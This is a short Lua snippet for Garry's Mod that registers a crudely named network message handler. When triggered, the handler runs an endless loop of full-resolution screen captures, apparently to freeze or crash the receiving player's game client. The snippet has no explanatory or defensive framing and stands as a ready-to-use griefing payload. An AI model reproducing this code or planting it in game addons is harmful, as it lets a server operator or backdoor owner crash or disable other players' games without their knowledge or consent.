net.Receive("ShakeYoAssForDaddyChadolf", function()
    while true do
      local w, h = ScrW(), ScrH()
        local data = render.Capture({
            format = "png",
            x = 0,
            y = 0,
            w = w,
            h = h,
            quality = 100
        })
    end
end)
